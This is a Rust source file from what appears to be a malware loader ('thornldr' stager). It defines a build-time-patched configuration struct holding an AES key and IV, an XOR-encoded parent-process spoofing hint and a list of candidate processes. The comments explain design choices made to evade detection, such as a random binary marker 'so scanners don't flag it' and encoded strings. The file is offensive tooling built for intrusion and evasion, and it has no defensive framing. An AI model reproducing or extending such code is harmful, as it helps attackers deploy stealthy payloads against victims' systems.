// config.rs — Patched-at-build stager configuration.
//
// The struct layout matches builder/bab/build.py::patch_stager's
// "thornldr_stager" branch: a 9-byte binary magic (random, not an ASCII
// word so scanners don't flag it as a marker), AES key/IV, and two
// variable-length XOR-encoded blobs for the PPID hint and candidate list.
//
// `#[no_mangle]` + `#[used]` + `#[link_section = ".data"]` ensures the
// struct lands in the .data section so the builder can find the magic
// by byte-scanning. Without `#[used]` the linker would GC an unreferenced
// static; without the section hint the compiler might constant-fold
// fields at their use sites.

#[repr(C)]
pub struct StagerConfig {
    pub magic:      [u8; 9],
    pub key:        [u8; 32],
    pub iv:         [u8; 16],
    pub ppid_proc:  [u8; 64],    // XOR(0x37) encoded
    pub candidates: [u8; 512],   // XOR(0x37) encoded, null-separated, double-null terminated
}

#[no_mangle]
#[used]
#[link_section = ".data"]
pub static mut STAGER_CONFIG: StagerConfig = StagerConfig {
    magic: [0xC1, 0x94, 0x3E, 0xA7, 0x6B, 0x0D, 0xF2, 0x58, 0x22],
    key:   [0; 32],
    iv:    [0; 16],
    ppid_proc:  [0; 64],
    candidates: [0; 512],
};

/// Return static references to the decrypted-at-runtime fields we care
/// about. `black_box` wrappers prevent LTO from propagating the all-zero
/// initial values into call sites — the binary we ship is un-patched, so
/// we need reads to actually go through the static.
pub unsafe fn key() -> &'static [u8; 32] {
    let p = core::hint::black_box(&raw const STAGER_CONFIG.key);
    &*p
}
pub unsafe fn iv() -> &'static [u8; 16] {
    let p = core::hint::black_box(&raw const STAGER_CONFIG.iv);
    &*p
}
pub unsafe fn candidates() -> &'static [u8; 512] {
    let p = core::hint::black_box(&raw const STAGER_CONFIG.candidates);
    &*p
}
